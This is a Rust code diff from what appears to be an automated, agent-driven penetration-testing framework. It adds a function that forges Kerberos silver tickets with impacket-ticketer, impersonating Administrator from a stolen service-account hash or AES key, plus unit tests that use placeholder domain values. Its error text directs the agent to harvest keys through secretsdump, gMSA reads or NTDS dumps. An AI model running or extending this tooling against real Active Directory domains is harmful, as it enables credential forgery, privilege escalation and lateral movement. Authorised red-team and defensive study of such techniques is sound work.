@@ -6,6 +6,7 @@ use serde_json::Value;
 use crate::args::{optional_str, required_str};
 use crate::credentials;
 use crate::executor::CommandBuilder;
+use crate::parsers::SILVER_TICKET_SPN_MARKER;
 use crate::ToolOutput;
 
 /// Find delegation configurations in the domain using impacket-findDelegation.
@@ -119,6 +120,102 @@ pub async fn generate_golden_ticket(args: &Value) -> Result<ToolOutput> {
         .timeout_secs(120)
         .execute()
         .await
+}
+
+/// Forge a Kerberos silver ticket (a service ticket for one SPN) using
+/// impacket-ticketer.
+///
+/// Required args: `username` (the account that owns `spn`, e.g. `SQL01$` or
+/// `svc_sql`), `domain`, `spn`, `domain_sid`
+/// Auth — one of `hash`/`nt_hash`/`ntlm_hash` (NTLM) or `aes_key` (AES256)
+/// Optional args: `impersonate` (the principal embedded in the ticket,
+/// defaults to `Administrator`)
+///
+/// `username` names the *signing* account, not the ticket's subject. That
+/// split is what makes the tool reachable: the worker's credential resolver
+/// keys `hash`/`aes_key` injection off `(username, domain)`, so naming the
+/// service account there is the only way state-held material reaches ticketer.
+/// The subject travels in `impersonate`, matching [`s4u_attack`].
+///
+/// On success the SPN is stamped into stdout as [`SILVER_TICKET_SPN_MARKER`].
+/// ticketer's own output is byte-identical for a TGT and an SPN-scoped TGS —
+/// same `Saving ticket in <principal>.ccache` line, no mention of the scope —
+/// so that marker is the only thing that tells the two apart downstream. The
+/// parser reads it for the forged-service evidence, and the orchestrator's
+/// golden-ticket completion check uses its presence to refuse to publish a
+/// domain-wide TGT milestone off a single-service ticket.
+pub async fn generate_silver_ticket(args: &Value) -> Result<ToolOutput> {
+    let spn = required_str(args, "spn")?;
+    let ticket_dir = std::path::PathBuf::from(SILVER_TICKET_DIR);
+    let _ = std::fs::create_dir_all(&ticket_dir);
+    let mut output = build_silver_ticket_command(args)?
+        .current_dir(&ticket_dir)
+        .execute()
+        .await?;
+
+    if output.success {
+        output
+            .stdout
+            .push_str(&format!("\n{SILVER_TICKET_SPN_MARKER}{spn}\n"));
+    }
+    Ok(output)
+}
+
+/// Directory the forged silver ticket is written to. Shared with the
+/// inter-realm forge so operation teardown's ccache sweep covers it.
+const SILVER_TICKET_DIR: &str = "/tmp/ares-tickets";
+
+/// Build the `impacket-ticketer` command for a silver ticket.
+///
+/// Split out from [`generate_silver_ticket`] so unit tests can assert on the
+/// constructed argument vector (via `args_for_test`) without spawning the
+/// binary.
+///
+/// AES is preferred over the NT hash whenever state carries one: a silver
+/// ticket is presented straight to the service, and a host configured for
+/// AES-only Kerberos rejects an RC4-encrypted TGS. ticketer refuses both key
+/// forms at once ("Pick only one"), so this is an either/or, not a pair.
+#[doc(hidden)]
+pub fn build_silver_ticket_command(args: &Value) -> Result<CommandBuilder> {
+    let username = required_str(args, "username")?;
+    let domain = required_str(args, "domain")?;
+    let spn = required_str(args, "spn")?;
+    let domain_sid = required_str(args, "domain_sid")?;
+    let impersonate = optional_str(args, "impersonate")
+        .filter(|s| !s.is_empty())
+        .unwrap_or("Administrator");
+    let aes_key = optional_str(args, "aes_key").filter(|s| !s.is_empty());
+
+    if !spn.contains('/') {
+        anyhow::bail!(
+            "generate_silver_ticket: `spn` must be a service class and host \
+             (e.g. cifs/sql01.contoso.local), got '{spn}'. A silver ticket is \
+             scoped to one SPN — without the service class ticketer forges a \
+             ticket no service will accept."
+        );
+    }
+
+    let mut cmd = CommandBuilder::new("impacket-ticketer")
+        .flag("-domain-sid", domain_sid)
+        .flag("-domain", domain)
+        .flag("-spn", spn)
+        .flag("-user-id", "500");
+
+    if let Some(aes) = aes_key {
+        cmd = cmd.flag("-aesKey", aes);
+    } else if let Some(raw) = credentials::ntlm_hash_arg(args) {
+        cmd = cmd.flag("-nthash", credentials::nt_hash_only(raw));
+    } else {
+        anyhow::bail!(
+            "generate_silver_ticket needs the signing key for '{username}' in \
+             {domain}: supply `aes_key` (AES256) or `hash`/`nt_hash`/`ntlm_hash` \
+             (NTLM). Neither was present in operation state for that principal — \
+             harvest the service account's key (secretsdump of a host it runs on, \
+             a gMSA read, or an NTDS dump) before forging."
+        );
+    }
+
+    Ok(cmd.arg(impersonate).timeout_secs(120))
 }
 
 /// Apply the shared auth precedence to an impacket command whose identity is a
@@ -709,6 +806,148 @@ mod tests {
         assert!(optional_str(&args, "extra_sid").is_none());
     }
 
+    fn silver_ticket_base() -> Value {
+        json!({
+            "username": "SQL01$",
+            "domain": "contoso.local",
+            "spn": "MSSQLSvc/sql01.contoso.local:1433",
+            "domain_sid": "S-1-5-21-1234567890-987654321-1122334455",
+            "hash": "0123456789abcdef0123456789abcdef",
+        })
+    }
+
+    #[test]
+    fn silver_ticket_forges_for_the_named_spn() {
+        let cmd = super::build_silver_ticket_command(&silver_ticket_base()).unwrap();
+        let argv = cmd.args_for_test();
+        assert_eq!(
+            flag_value(argv, "-spn"),
+            Some("MSSQLSvc/sql01.contoso.local:1433")
+        );
+        assert_eq!(flag_value(argv, "-domain"), Some("contoso.local"));
+        assert_eq!(
+            flag_value(argv, "-domain-sid"),
+            Some("S-1-5-21-1234567890-987654321-1122334455")
+        );
+        assert_eq!(flag_value(argv, "-user-id"), Some("500"));
+    }
+
+    /// The distinguishing property against `generate_golden_ticket`: the key is
+    /// the service account's, never krbtgt's, and `-spn` is always present. A
+    /// silver ticket without `-spn` is a golden ticket signed with the wrong key.
+    #[test]
+    fn silver_ticket_never_forges_a_tgt() {
+        let cmd = super::build_silver_ticket_command(&silver_ticket_base()).unwrap();
+        let argv = cmd.args_for_test();
+        assert!(
+            argv.iter().any(|a| a == "-spn"),
+            "silver ticket must be SPN-scoped: {argv:?}"
+        );
+        assert!(
+            argv.iter().all(|a| !a.starts_with("krbtgt/")),
+            "a krbtgt SPN makes this a golden ticket: {argv:?}"
+        );
+    }
+
+    #[test]
+    fn silver_ticket_defaults_the_embedded_principal_to_administrator() {
+        let cmd = super::build_silver_ticket_command(&silver_ticket_base()).unwrap();
+        assert!(cmd.args_for_test().iter().any(|a| a == "Administrator"));
+    }
+
+    #[test]
+    fn silver_ticket_honours_the_impersonate_override() {
+        let args = with_arg(&silver_ticket_base(), "impersonate", "alice");
+        let cmd = super::build_silver_ticket_command(&args).unwrap();
+        let argv = cmd.args_for_test();
+        assert!(argv.iter().any(|a| a == "alice"));
+        assert!(argv.iter().all(|a| a != "Administrator"));
+    }
+
+    /// AES wins over the NT hash: the forged TGS goes straight to the service,
+    /// and an AES-only host rejects an RC4 ticket. ticketer refuses both key
+    /// flags at once, so only one may appear.
+    #[test]
+    fn silver_ticket_prefers_aes_over_the_nt_hash() {
+        let aes = "c".repeat(64);
+        let args = with_arg(&silver_ticket_base(), "aes_key", &aes);
+        let cmd = super::build_silver_ticket_command(&args).unwrap();
+        let argv = cmd.args_for_test();
+        assert_eq!(flag_value(argv, "-aesKey"), Some(aes.as_str()));
+        assert!(
+            argv.iter().all(|a| a != "-nthash"),
+            "ticketer rejects -nthash alongside -aesKey: {argv:?}"
+        );
+    }
+
+    #[test]
+    fn silver_ticket_strips_the_lm_half_from_a_pair() {
+        let args = with_arg(&silver_ticket_base(), "hash", &format!("{LM}:{NT}"));
+        let cmd = super::build_silver_ticket_command(&args).unwrap();
+        assert_eq!(flag_value(cmd.args_for_test(), "-nthash"), Some(NT));
+    }
+
+    #[test]
+    fn silver_ticket_accepts_nt_hash_and_ntlm_hash_spellings() {
+        for key in ["nt_hash", "ntlm_hash"] {
+            let mut args = silver_ticket_base();
+            args.as_object_mut().unwrap().remove("hash");
+            let args = with_arg(&args, key, NT);
+            let cmd = super::build_silver_ticket_command(&args)
+                .unwrap_or_else(|e| panic!("{key} must satisfy the signing key: {e}"));
+            assert_eq!(flag_value(cmd.args_for_test(), "-nthash"), Some(NT));
+        }
+    }
+
+    /// Without a key the wrapper must refuse rather than let ticketer prompt or
+    /// forge with nothing — and the error has to name every accepted spelling so
+    /// the agent knows what to harvest.
+    #[test]
+    fn silver_ticket_without_a_signing_key_errors_naming_every_form() {
+        let mut args = silver_ticket_base();
+        args.as_object_mut().unwrap().remove("hash");
+        let Err(err) = super::build_silver_ticket_command(&args) else {
+            panic!("a silver ticket cannot be forged without the service account's key");
+        };
+        let err = err.to_string();
+        for form in ["aes_key", "hash", "nt_hash", "ntlm_hash"] {
+            assert!(err.contains(form), "error must name `{form}`; got: {err}");
+        }
+    }
+
+    #[test]
+    fn silver_ticket_empty_hash_is_treated_as_absent() {
+        let args = with_arg(&silver_ticket_base(), "hash", "");
+        assert!(super::build_silver_ticket_command(&args).is_err());
+    }
+
+    /// A bare hostname or service class alone forges a TGS no service accepts,
+    /// and ticketer exits 0 doing it — reject it before the subprocess runs.
+    #[test]
+    fn silver_ticket_rejects_an_spn_without_a_service_class() {
+        for bad in ["sql01.contoso.local", "cifs", ""] {
+            let args = with_arg(&silver_ticket_base(), "spn", bad);
+            assert!(
+                super::build_silver_ticket_command(&args).is_err(),
+                "spn {bad:?} must be refused"
+            );
+        }
+    }
+
+    #[test]
+    fn silver_ticket_requires_the_domain_sid() {
+        let mut args = silver_ticket_base();
+        args.as_object_mut().unwrap().remove("domain_sid");
+        assert!(super::build_silver_ticket_command(&args).is_err());
+    }
+
+    #[test]
+    fn silver_ticket_requires_the_signing_account_username() {
+        let mut args = silver_ticket_base();
+        args.as_object_mut().unwrap().remove("username");
+        assert!(super::build_silver_ticket_command(&args).is_err());
+    }
+
     /// impacket-addcomputer exits 0 on a refused delete, so the exit code
     /// alone reports a machine account as removed while it is still in the
     /// directory. Observed live on three noPac accounts.
@@ -1084,6 +1323,13 @@ mod tests {
             "username": "fakeadmin"
         });
         assert!(generate_golden_ticket(&args).await.is_ok());
+    }
+
+    #[tokio::test]
+    async fn generate_silver_ticket_executes() {
+        mock::push(mock::success());
+        let args = silver_ticket_base();
+        assert!(generate_silver_ticket(&args).await.is_ok());
     }
 
     #[tokio::test]
